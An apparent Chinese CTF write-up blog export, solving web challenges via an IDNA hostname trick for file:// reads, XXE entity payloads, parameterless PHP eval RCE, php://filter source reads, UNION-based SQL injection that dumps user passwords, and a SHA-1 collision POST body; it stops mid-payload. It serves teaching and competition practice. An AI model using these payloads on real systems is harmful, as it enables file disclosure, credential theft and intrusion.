<div class="hljs"><pre><code class="hljs vim"><span class="hljs-keyword">file</span>://suctf.<span class="hljs-keyword">cc</span>/usr/local/nginx/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span>
利用漏洞改为
<span class="hljs-keyword">file</span>://suctf.<span class="hljs-keyword">c</span>℆sr/local/nginx/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span></code></pre></div>

<p>给出flag路径</p>
<div class="hljs"><pre><code class="hljs crmsh">server &#123; listen <span class="hljs-number">80</span>; <span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123; try_files</span> $uri @app; &#125; <span class="hljs-keyword">location</span> <span class="hljs-title">@app</span> &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; <span class="hljs-keyword">location</span> <span class="hljs-title">/static</span> &#123; alias /app/static; &#125; <span class="hljs-comment"># location /flag &#123; # alias /usr/fffffflag; # &#125; &#125;</span>
 
构造
file://suctf.c℆sr/fffffflag

拿到flag</code></pre></div>

<p>为了直观感受url处理过程，写了脚本</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlsplit, urlunsplit
url= <span class="hljs-string">"file://suctf.c℆sr/local/nginx/conf/nginx.conf"</span>
host = parse.urlparse(url).hostname
<span class="hljs-comment">#print(host)</span>
parts = list(urlsplit(url))
print(parts)
newhost=[]
<span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">'.'</span>):
    newhost.append(h.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>))
print(newhost)
parts[<span class="hljs-number">1</span>] = <span class="hljs-string">'.'</span>.join(newhost)
print(parts)
finalUrl = urlunsplit(parts).split(<span class="hljs-string">' '</span>)[<span class="hljs-number">0</span>]
print(finalUrl)</code></pre></div>

<p>结果</p>
<div class="hljs"><pre><code class="hljs vim">[<span class="hljs-string">'file'</span>, <span class="hljs-string">'suctf.c℆sr'</span>, <span class="hljs-string">'/local/nginx/conf/nginx.conf'</span>, <span class="hljs-string">''</span>, <span class="hljs-string">''</span>]
[<span class="hljs-string">'suctf'</span>, <span class="hljs-string">'cc/usr'</span>]
[<span class="hljs-string">'file'</span>, <span class="hljs-string">'suctf.cc/usr'</span>, <span class="hljs-string">'/local/nginx/conf/nginx.conf'</span>, <span class="hljs-string">''</span>, <span class="hljs-string">''</span>]
<span class="hljs-keyword">file</span>://suctf.<span class="hljs-keyword">cc</span>/usr/local/nginx/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span></code></pre></div>



<p>找出类似可用字符的脚本</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">128</span>,<span class="hljs-number">65537</span>):
    tmp=chr(i)
    <span class="hljs-keyword">try</span>:
        res = tmp.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>)
        <span class="hljs-keyword">if</span>(<span class="hljs-string">"-"</span>) <span class="hljs-keyword">in</span> res:
            <span class="hljs-keyword">continue</span>
        print(<span class="hljs-string">"U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; "</span>.format(tmp, res, i))
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">pass</span></code></pre></div>

<hr>
<p>参考：</p>
<blockquote>
<p><a href="https://blog.csdn.net/qq_42181428/article/details/99741920" target="_blank" rel="noopener">https://blog.csdn.net/qq_42181428/article/details/99741920</a></p>
</blockquote>
<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p><code>xxe</code>攻击</p>
<p>抓包显示的结果是</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>a<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div>

<p>是xml格式的数据，所以可能存在xxe漏洞（外部实体注入），即利用输入位置向存储的表中添加一个外部实体，让这个实体包含内部文件，造成数据泄露。</p>
<p>xml注入是利用闭合标签改写XML文件实现更改数据，xxe是引用外部实体来达到目的。</p>
<p>php引用外部实体，常见的协议</p>
<div class="hljs"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>://文件绝对路径 如：<span class="hljs-built_in">file</span>:<span class="hljs-comment">///etc/passwd</span>
<span class="hljs-keyword">http</span>://url/<span class="hljs-built_in">file</span>.txt
php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=xxx.php</code></pre></div>

<p>这篇博客写的很清楚，<a href="https://xz.aliyun.com/t/6887" target="_blank" rel="noopener">传送门</a></p>
<p>直接构造payload，拿到flag</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">hack</span> [</span>
<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span>  <span class="hljs-meta-string">"file:///flag"</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div>

<blockquote>
<!ENTITY file SYSTEM  "file:///flag">

<p>这里的file是外部实体</p>
<p><username>&file;</username></p>
<p>这里的&amp;file是xml中的参数</p>
</blockquote>
<p>还可以用php://filter/read=convert.base64-encode/resource=xxx.php,读取源码</p>
<p>直接构造</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">hack</span> [</span>
<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span>  <span class="hljs-meta-string">"php://filter/read=convert.base64-encode/resource=doLogin.php"</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div>

<p>解码后的源码，可以拿到admin和密码，但是登录也没啥东西，考察点就是xxe。。。</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/**</span>
<span class="hljs-comment">* autor: c0ny1</span>
<span class="hljs-comment">* date: 2018-2-7</span>
<span class="hljs-comment">*/</span>

$USERNAME = <span class="hljs-string">'admin'</span>; <span class="hljs-comment">//璐﹀彿</span>
$PASSWORD = <span class="hljs-string">'024b87931a03f738fff6693ce0a78c88'</span>; <span class="hljs-comment">//瀵嗙爜</span>
$result = <span class="hljs-keyword">null</span>;

libxml_disable_entity_loader(<span class="hljs-keyword">false</span>);
$xmlfile = file_get_contents(<span class="hljs-string">'php://input'</span>);

<span class="hljs-keyword">try</span>&#123;
	$dom = <span class="hljs-keyword">new</span> DOMDocument();
	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$creds = simplexml_import_dom($dom);

	$username = $creds-&gt;username;
	$password = $creds-&gt;password;

	<span class="hljs-keyword">if</span>($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;
		$result = sprintf(<span class="hljs-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="hljs-number">1</span>,$username);
	&#125;<span class="hljs-keyword">else</span>&#123;
		$result = sprintf(<span class="hljs-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="hljs-number">0</span>,$username);
	&#125;	
&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-keyword">Exception</span> $e)&#123;
	$result = sprintf(<span class="hljs-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="hljs-number">3</span>,$e-&gt;getMessage());
&#125;

header(<span class="hljs-string">'Content-Type: text/html; charset=utf-8'</span>);
<span class="hljs-keyword">echo</span> $result;
<span class="hljs-meta">?&gt;</span></code></pre></div>



<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>.git源码泄露</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag在哪里呢？&lt;br&gt;"</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'exp'</span>]))&#123;
    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="hljs-string">'exp'</span>])) &#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-string">';'</span> === preg_replace(<span class="hljs-string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="hljs-keyword">NULL</span>, $_GET[<span class="hljs-string">'exp'</span>])) &#123;
            <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="hljs-string">'exp'</span>])) &#123;
                <span class="hljs-comment">// echo $_GET['exp'];</span>
                @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'exp'</span>]);
            &#125;
            <span class="hljs-keyword">else</span>&#123;
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"还差一点哦！"</span>);
            &#125;
        &#125;
        <span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"再好好想想！"</span>);
        &#125;
    &#125;
    <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"还想读flag，臭弟弟！"</span>);
    &#125;
&#125;
<span class="hljs-comment">// highlight_file(__FILE__);</span>
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>第一个<code>if</code>：常用的伪协议被禁了</p>
<p>第二个<code>if</code>正则匹配，<code>?R</code> 表示引用当前表达式，就比如引用一次：<br><code>[a-z,_]+[a-z,_]+\((?R)?\)</code>，所以一个合法的表达式可以是<code>a(b();)</code>，括号和字符组成的</p>
<p>第三个<code>if</code>就过滤一些函数包含的字符，导致了许多函数无法使用。</p>
<blockquote>
<p>1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。 </p>
<p>2.过滤了常用的几个伪协议，不能以伪协议读取文件。 </p>
<p>3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。 </p>
<p>4.正则匹配掉了et/na/info等关键字，很多函数都用不了。</p>
<p> 5：eval($_GET[‘exp’]); </p>
</blockquote>
<p>考察点无参RCE</p>
<p>exp：</p>
<div class="hljs"><pre><code class="hljs reasonml">?exp=highlight<span class="hljs-constructor">_file(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))));</code></pre></div>

<p>这里用到反转函数是因为，flag.php在倒数第二个位置，无法使用end()获取，反转后可以直接受用next()获取，方便很多。</p>
<p><strong>localeconv()</strong> 函数返回一包含本地数字及货币格式信息的数组。</p>
<p><strong>current()</strong> 函数返回数组中的当前元素的值。</p>
<blockquote>
<p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p>
<p><strong>提示：</strong>该函数不会移动数组内部指针。要做到这一点，请使用 <a href="https://www.w3school.com.cn/php/func_array_krsort.asp" target="_blank" rel="noopener">next()</a> 和 <a href="https://www.w3school.com.cn/php/func_array_krsort.asp" target="_blank" rel="noopener">prev()</a> 函数。</p>
<p>相关的方法：</p>
<ul>
<li><a href="https://www.w3school.com.cn/php/func_array_end.asp" target="_blank" rel="noopener">end()</a> - 将内部指针指向数组中的最后一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_next.asp" target="_blank" rel="noopener">next()</a> - 将内部指针指向数组中的下一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_prev.asp" target="_blank" rel="noopener">prev()</a> - 将内部指针指向数组中的上一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_reset.asp" target="_blank" rel="noopener">reset()</a> - 将内部指针指向数组中的第一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_each.asp" target="_blank" rel="noopener">each()</a> - 返回当前元素的键名和键值，并将内部指针向前移动</li>
</ul>
</blockquote>
<p><strong>array_reverse()</strong> 函数以相反的元素顺序返回数组。</p>
<p>array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。</p>
<p>如果第二个参数指定为 true，则元素的键名保持不变，否则键名将丢失。</p>
<p><a href="https://www.w3school.com.cn/php/func_array_reverse.asp" target="_blank" rel="noopener">详情</a></p>
<p><strong>array_flip()</strong> 函数用于反转/交换数组中所有的键名以及它们关联的键值。</p>
<p>array_flip() 函数返回一个反转后的数组，如果同一值出现了多次，则最后一个键名将作为它的值，所有其他的键名都将丢失。</p>
<p>如果原数组中的值的数据类型不是字符串或整数，函数将报错。</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>md5</tag>
        <tag>ssrf</tag>
        <tag>system</tag>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>cumtctf</title>
    <url>/2020/09/27/cumtctf/</url>
    <content><![CDATA[<h1 id="CUMTCTF-wp"><a href="#CUMTCTF-wp" class="headerlink" title="CUMTCTF-wp"></a>CUMTCTF-wp</h1><a id="more"></a>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>提示GET一个1,那就 url+?1</p>
<p><img src="/2020/09/27/cumtctf/w1.png" srcset="/img/loading.gif" alt></p>
<p>提示post一个2</p>
<p>那就post一个</p>
<p><strong>注意的是要2=任意字符才出现源码</strong></p>
<p> <img src="/2020/09/27/cumtctf/w2.png" srcset="/img/loading.gif" alt></p>
<p>审计代码，这里应该是利用file_get_contents()的漏洞直接读网页源码，并且提示flag在flag.php,直接<code>php://filter/read=convert.base64-encode/resource=flag.php</code>，读取base64源码之后解码即可</p>
<p><img src="/2020/09/27/cumtctf/w4.png" srcset="/img/loading.gif" alt></p>
<p>PD9waHANCgkkZmxhZz0iQ1VNVENURnsxNzkwNTViNC1lOGY1LTQyZDItYmZlNC0wMjdkMTVlOTQ2YjJ9Ijs=</p>
<h3 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h3><p>首先判断是否存在注入<code>username=admin&amp;password=pw&#39;</code></p>
<p>在后面加上单引号后出现报错提示，确认有注入点</p>
<p>但是继续测试 <code>&#39;or 1=1 #</code>会出现</p>
<p><img src="/2020/09/27/cumtctf/w2-1.png" srcset="/img/loading.gif" alt></p>
<p>判断存在黑名单过滤。</p>
<p>接下来就是判断是将什么加入黑名单了，经过字典测试发现是<strong>空格</strong>，这里可以使用/**/绕过。</p>
<p>先测试有多少列，<code>&#39;union/**/select/**/1,2,3,4,5,6,7#</code>  到第七的时候，页面报错。</p>
<p>   <code>&#39;union/**/select/**/1,2,3,4,5,6,7,8#</code> 到第八的时候显示下图，说明一共八列，并且第四列出现回显。</p>
<p><img src="/2020/09/27/cumtctf/w2-2.png" srcset="/img/loading.gif" alt></p>
<p><strong>爆表</strong></p>
<div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(TABLE_NAME),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.TABLES<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>TABLE_SCHEMA=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span></code></pre></div>

<p><strong>爆列名</strong></p>
<div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(COLUMN_NAME),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.COLUMNS<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>TABLE_NAME=<span class="hljs-string">'users'</span><span class="hljs-comment">#</span></code></pre></div>

<p><code>user_id,first_name,last_name,user,password,avatar,last_login,failed_login</code>列名很多，选择password</p>
<p><strong>爆flag</strong></p>
<div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">password</span>),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">users</span><span class="hljs-comment">#</span></code></pre></div>

<p><img src="/2020/09/27/cumtctf/w2-3.png" srcset="/img/loading.gif" alt></p>
<h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>扫描一下目录发现存在一个<a href="http://www.zip的文件，直接下载得到源码，下面就是一层一层的绕过" target="_blank" rel="noopener">www.zip的文件，直接下载得到源码，下面就是一层一层的绕过</a></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include_once</span>(<span class="hljs-string">'flag.php'</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'param1'</span>]))
&#123;
    $str1=$_GET[<span class="hljs-string">'param1'</span>];
    <span class="hljs-keyword">if</span>(file_get_contents($str1)!==<span class="hljs-string">'Suvin_wants_a_girlfriend'</span>)
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"Suvin doesn't like you"</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'param2'</span>]))&#123;
        $str2=$_GET[<span class="hljs-string">'param2'</span>];
        <span class="hljs-keyword">if</span>(!is_numeric($str2))
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Suvin prefers strings of Numbers'</span>);
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($str2&lt;<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">30</span>)
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Suvin says the num is too short'</span>);
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($str2&gt;<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">31</span>)
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Suvin says the num is too long'</span>);
        <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Suvin says he's falling in love with you!"</span>.<span class="hljs-string">"&lt;/br&gt;"</span>;
            sleep(intval($str2)); 
        &#125;
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'param1'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'param2'</span>])) &#123;
            $str1=$_POST[<span class="hljs-string">'param1'</span>];
            $str2=$_POST[<span class="hljs-string">'param2'</span>];
            <span class="hljs-keyword">if</span>(strlen($str1)&gt;<span class="hljs-number">1000</span>)
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"It's too long"</span>);
            <span class="hljs-keyword">if</span>(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))
                <span class="hljs-keyword">echo</span> $flag;
            <span class="hljs-keyword">else</span> 
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"It's so similar to md5"</span>);
        &#125;
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>首先get方式获取两个参数，param1要等于那个字符串，这里使用php的data伪协议</p>
<p>param2要在<code>3600*24*30</code>和<code>3600*24*31</code>之间，可以取2.6e6,这两个参数绕过后，就要绕过下面的post方式上传的两个值</p>
<p>对parame1的长度进行了限制，并且两参数的字符串形式不相等，sha1的值要相等，首先想到的是与md5函数一样，使用数组绕过，但是这题没那么简单，试了很多次都不行。网上搜了一下，发现了一个很类似的题目（sha1弱碰撞），其中也给出符合要求的字符串。</p>
<p><a href="https://blog.csdn.net/caiqiiqi/article/details/68953730?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-1-68953730.nonecase&utm_term=%E4%B8%8D%E5%90%8C%E5%AD%97%E7%AC%A6%E4%B8%B2sha1%E4%B8%80%E6%A0%B7" target="_blank" rel="noopener">点这里</a></p>
<p>完整的payload：</p>
<p><code>?param1=data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k&amp;param2=0.26e7</code></p>
<div class="hljs"><pre><code class="hljs llvm">POST:
param<span class="hljs-number">1</span>=<span class="hljs-symbol">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%25</span><span class="hljs-symbol">%E2</span><span class="hljs-symbol">%E3</span><span class="hljs-symbol">%CF</span><span class="hljs-symbol">%D3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-number">1</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>obj<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%3</span>C<span class="hljs-symbol">%3</span>C/Width<span class="hljs-symbol">%202</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Height<span class="hljs-symbol">%203</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Type<span class="hljs-symbol">%204</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Subtype<span class="hljs-symbol">%205</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Filter<span class="hljs-symbol">%206</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/ColorSpace<span class="hljs-symbol">%207</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Length<span class="hljs-symbol">%208</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/BitsPerComponent<span class="hljs-symbol">%208</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%0</span>Astream<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%FF</span><span class="hljs-symbol">%D8</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-symbol">%20</span>is<span class="hljs-symbol">%20</span>dead<span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%85</span>/<span class="hljs-symbol">%EC</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%239</span>u<span class="hljs-symbol">%9</span>C<span class="hljs-number">9</span><span class="hljs-symbol">%B1</span><span class="hljs-symbol">%A1</span><span class="hljs-symbol">%C6</span><span class="hljs-symbol">%3</span>CL<span class="hljs-symbol">%97</span><span class="hljs-symbol">%E1</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%7</span>FF<span class="hljs-symbol">%DC</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%A6</span><span class="hljs-symbol">%B6</span><span class="hljs-symbol">%7</span>E<span class="hljs-symbol">%01</span><span class="hljs-symbol">%3</span>B<span class="hljs-symbol">%02</span><span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%AA</span><span class="hljs-symbol">%1</span>D<span class="hljs-symbol">%B2V</span><span class="hljs-symbol">%0</span>BE<span class="hljs-symbol">%CAg</span><span class="hljs-symbol">%D6</span><span class="hljs-symbol">%88</span><span class="hljs-symbol">%C7</span><span class="hljs-symbol">%F8K</span><span class="hljs-symbol">%8</span>CLy<span class="hljs-symbol">%1</span>F<span class="hljs-symbol">%E0</span><span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%F6</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%F8m</span><span class="hljs-symbol">%B1i</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%C5kE</span><span class="hljs-symbol">%C1S</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%FE</span><span class="hljs-symbol">%DF</span><span class="hljs-symbol">%B7</span><span class="hljs-symbol">%608</span><span class="hljs-symbol">%E9rr</span>/<span class="hljs-symbol">%E7</span><span class="hljs-symbol">%ADr</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%0</span>EI<span class="hljs-symbol">%04</span><span class="hljs-symbol">%E0F</span><span class="hljs-symbol">%C20W</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%E9</span><span class="hljs-symbol">%D4</span><span class="hljs-symbol">%13</span><span class="hljs-symbol">%98</span><span class="hljs-symbol">%AB</span><span class="hljs-symbol">%E1.</span><span class="hljs-symbol">%F5</span><span class="hljs-symbol">%BC</span><span class="hljs-symbol">%94</span><span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%E35B</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%80</span>-<span class="hljs-symbol">%98</span><span class="hljs-symbol">%B5</span><span class="hljs-symbol">%D7</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-symbol">%C3</span><span class="hljs-symbol">%7</span>F<span class="hljs-symbol">%AC5</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%E7M</span><span class="hljs-symbol">%DC</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%2</span>C<span class="hljs-symbol">%C1</span><span class="hljs-symbol">%A8t</span><span class="hljs-symbol">%CD</span><span class="hljs-symbol">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-symbol">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-symbol">%97</span><span class="hljs-symbol">%89</span><span class="hljs-symbol">%60</span>k<span class="hljs-symbol">%D0</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%3</span>F<span class="hljs-symbol">%98</span><span class="hljs-symbol">%CD</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%04</span>F<span class="hljs-symbol">%29</span><span class="hljs-symbol">%A1</span>&amp;param<span class="hljs-number">2</span>=<span class="hljs-symbol">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%25</span><span class="hljs-symbol">%E2</span><span class="hljs-symbol">%E3</span><span class="hljs-symbol">%CF</span><span class="hljs-symbol">%D3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-number">1</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>obj<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%3</span>C<span class="hljs-symbol">%3</span>C/Width<span class="hljs-symbol">%202</span><span 